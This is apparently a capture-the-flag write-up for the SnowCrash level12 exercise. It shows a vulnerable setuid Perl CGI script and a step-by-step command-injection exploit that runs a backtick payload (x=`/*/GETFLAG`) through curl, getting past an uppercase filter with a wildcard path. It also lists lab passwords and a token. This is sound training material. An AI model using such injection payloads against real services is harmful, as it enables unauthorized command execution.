# Level12 - Flag12

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|         |                             |
| ------- | --------------------------- |
| level11 | `fa6v5ateaw21peobuub8ipe6s` |
| flag11  |                             |
| token   | `g1qKMiRpXf53AWhDaU7FEkczr` |

## Steps to resolve on VM

1. Connect to `level12` user and notice there is a lua script with setuid bit

```bash
ssh level12@$SNOW_HOST -p 4242
# Enter the password

ls -l

> -rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

2. Check the file

```bash
cat level12.pl
```

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1]; # param y
  $xx = $_[0]; # param x
  $xx =~ tr/a-z/A-Z/; # param x - to uppercase
  $xx =~ s/\s.*//;    # param x - remove everything after the first whitespace
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) { # t result
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

While reading the script, we can see what the program do.

Nothing very interesting, but we can use the x parameter to inject a command.

But it's a little bit tricky, because there is a first translation from lowercase to uppercase. And then a substitute expression that removes everything after the first whitespace. So we need to deal with.

In addition, we can notice "localhost:4646"

3. Check ports

Is 4646 port open ?

```bash
netstat -tulpn | grep 4646

> Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
> tcp6       0      0 :::4646                 :::*                    LISTEN      -
```

Yes it is !

Is the program up ?

```bash
curl localhost:4646

> ..
```

Yes it is ! That's a good news. It just print "..", but it is up.

4. Create an uppercase `GETFLAG` script

We have to deal with lowercase substitution and avoid whitespaces

```bash
echo "getflag > /tmp/out" > /tmp/GETFLAG
chmod +x /tmp/GETFLAG
```

We have an other problem. How deal with `tmp` that is lowercase ?

The solution `PATH=/tmp:$PATH` does not work, because flag12 environment is used instead of level12 environment. Neither aliases

Maybe a wildcard ?

```bash
/*/GETFLAG
cat /tmp/out

> Check flag.Here is your token :
> Nope there is no token here for you sorry. Try again :)
```

It perfectly works !

Now we have to inject this command through the server

5. Exploit subshell while injecting a command

```bash
curl -s localhost:4646?x=\`/*/GETFLAG\`
```

6. Get level flag

Finally, read `/tmp/out`

```bash
cat /tmp/out

> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

---

## Sources

### Shell

- [Check ports in use](https://www.cyberciti.biz/faq/unix-linux-check-if-port-is-in-use-command/)
